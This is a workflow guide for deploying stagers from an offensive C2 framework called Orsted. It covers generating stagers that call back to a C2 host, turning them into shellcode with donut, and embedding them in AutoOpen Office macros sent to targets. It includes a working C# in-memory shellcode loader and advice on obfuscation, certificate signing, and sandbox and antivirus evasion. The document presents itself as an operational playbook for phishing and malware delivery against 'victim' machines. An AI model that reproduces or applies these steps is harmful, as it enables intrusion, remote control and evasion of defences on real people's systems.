# Stager Workflow Guide

Practical examples for deploying stagers in real-world scenarios, including VBA embedding and shellcode conversion.

---

## Prerequisites

- Orsted server running and listening
- Orsted client connected to server
- `donut` binary available in `tools/donut` (included with orsted)
- Target C2 server IP and port known

---

## Workflow 1: Basic Stager Deployment (HTTP)

### Step 1: Generate Stager

In the Orsted client:

```bash
generate stager windows http 192.168.1.10:8080
```

**Output:** `stager_http_64.exe`

### Step 2: Deploy to Target

Transfer `stager_http_64.exe` to target (via USB, email, website, etc.)

### Step 3: Execute on Target

```cmd
C:\Users\victim\Downloads\stager_http_64.exe
```

**What happens:**
1. Stager registers with C2 server (192.168.1.10:8080)
2. Stager polls server for agent download URL
3. Server responds with `/agent/download/{beacon_id}?arch=64`
4. Stager downloads and validates full beacon binary
5. Stager executes beacon in-memory
6. Stager exits silently

### Step 4: Interact with Beacon

Once the full beacon is executing, use the Orsted client to interact normally:

```bash
interact <beacon_id>
ps
download C:\Windows\System32\cmd.exe
```

---

## Workflow 2: Stager + VBA Injection (Office Macro)

### Step 1: Generate 64-bit Stager

```bash
generate stager windows http 192.168.1.10:8080
```

### Step 2: Convert Stager to Shellcode

Use donut to convert the EXE to position-independent shellcode:

```bash
./tools/donut -i stager_http_64.exe -o stager_http_64.bin
```

**Output:** `stager_http_64.bin` — shellcode ready for injection

### Step 3: Create VBA Launcher

Use a tool like `ps1_encoder` or manual encoding to embed shellcode in VBA. Example VBA template:

```vba
Sub AutoOpen()
    Dim shellcode As String
    shellcode = "..." ' Base64-encoded shellcode from stager_http_64.bin
    ExecuteShellcode(shellcode)
End Sub

Sub ExecuteShellcode(shellcode As String)
    ' Decode base64 and execute in-memory
    ' This requires a shellcode runner like metasploit's excel macro generator
    ' or custom VBA with Windows API calls to allocate, write, and execute memory
End Sub
```

**Alternative:** Use public tools:
- **MSFVenom + donut combo:**
  ```bash
  donut -i stager_http_64.exe | msfvenom -p windows/custom -a x64 --payload-options
  ```
- **Metasploit macro generator** with donut output
- **NOPS sleeper** for sandbox evasion timing

### Step 4: Embed in Office Document

1. Create Word/Excel document
2. Insert macro (View → Macros → Edit)
3. Paste VBA code with embedded shellcode
4. Save as `.docm` (macro-enabled)
5. Send to target

### Step 5: Target Opens Document

When target opens the `.docm` file:
1. Macro runs (possibly after "Enable Content" click)
2. Shellcode is decoded and injected
3. Stager executes → registers → fetches full beacon
4. Full beacon runs in-memory

---

## Workflow 3: HTTPS Stager with Proxy (Corporate Environment)

### Step 1: Generate 32-bit HTTPS Stager with Proxy

```bash
generate stager windows https 192.168.1.10:443 -r 32 -t https -a 127.0.0.1:8080 -u proxyuser -p proxypass
```

**Output:** `stager_https_32.exe` (32-bit, HTTPS, with proxy auth)

### Step 2: Deploy to 32-bit Target

Copy to 32-bit Windows system:

```cmd
stager_https_32.exe
```

**Why 32-bit:** 
- Corporate systems often lock 64-bit executables
- 32-bit processes can sometimes bypass AV heuristics
- All traffic proxied through corporate proxy

### Step 3: Monitor Registration

In Orsted client, watch for new beacon:

```bash
interact <beacon_id>
info
```

---

## Workflow 4: Shellcode-Only Deployment (No EXE)

For environments where executables are blocked, use shellcode + in-memory loader.

### Step 1: Generate Stager + Convert to Shellcode

```bash
generate stager windows http 192.168.1.10:8080
./tools/donut -i stager_http_64.exe -o stager_http_64.bin
```

### Step 2: Create Custom .NET In-Memory Loader

Create a `.NET executable` that loads and executes the shellcode (bypasses file-based detection):

```csharp
using System;
using System.Runtime.InteropServices;

class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    static void Main() {
        byte[] shellcode = Convert.FromBase64String("SHELLCODE_BASE64_HERE");
        IntPtr ptr = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x1000, 0x40);
        Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
        CreateThread(IntPtr.Zero, UIntPtr.Zero, ptr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```

Compile this .NET binary (appears legitimate to AV), and it will:
1. Decode and load shellcode in-memory
2. Execute stager
3. Stager fetches full beacon

### Step 3: Obfuscate .NET Loader

Use tools like:
- **Confuser.NG** — .NET obfuscation
- **NetReactor** — managed code encryption
- **ConfuserEx** — free alternative

Then deliver the obfuscated loader.

---

## Troubleshooting

### Stager doesn't register
- Check firewall/network connectivity to C2 server
- Verify correct server IP:PORT
- Check proxy settings if applicable
- Review server logs: `interact <beacon_id> info`

### Stager registers but doesn't download
- Server endpoint `/agent/download/` may not be reachable
- Check full beacon binary exists on server at `beacons/main_http_64.exe`
- Verify beacon_id matches in database
- Check server error logs

### Shellcode fails to execute
- VBA macro runner may be disabled (Word Macro Security settings)
- Shellcode encoding/decoding may be incorrect
- Loader process may be sandboxed (Windows Defender sandboxing)
- Try adding sleep/delay before execution for sandbox evasion

### Small binary size (~50KB) detected as suspicious
- Legitimate stagers are small by design (lightweight + fetch model)
- Use donut + .NET loader to hide in "normal" .NET executable
- Sign stager with valid certificate
- Embed stager in legitimate-looking application

---

## Performance & OPSEC Considerations

### Bandwidth
- Stager (~50KB) + full beacon (~200-500KB) = ~600KB total download
- HTTPS encryption hides both payloads from network inspection
- Proxy traffic further obfuscates destination

### Detection Risk
- Stager is minimal → smaller file hash signature (easier to evade)
- Full beacon loaded in-memory only → no disk footprint
- Two-stage avoids deploying full agent to disk initially
- Donut shellcode → polymorphic (different hash each time)

### Callback Timing
- Stager polls server every 2 seconds by default
- Can be tuned in stager source if needed (edit `main_stager_http.go`)
- HTTPS + proxy adds latency but more OPSEC-friendly

---

## Advanced: Custom Stager Variants

To create stager variants:

1. **Edit `beacon/main_stager_http.go`** to customize:
   - Polling interval
   - Retry logic
   - User-Agent headers
   - Callback jitter

2. **Recompile** from CLI:
   ```bash
   GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -X main.TargetIP=192.168.1.10 -X main.TargetPort=8080" -o custom_stager.exe -tags=stager_http beacon/main_stager_http.go
   ```

3. **Convert to shellcode** and embed in custom launcher

---

## References

- **Donut documentation**: See `tools/donut` (integrated with orsted)
- **VBA macro security**: [Microsoft Office Macro Security](https://docs.microsoft.com/en-us/deployoffice/security/vba-macro-security)
- **Shellcode runners**: Metasploit, CobaltStrike, custom .NET loaders
- **OPSEC**: See Orsted documentation for full deployment guidelines
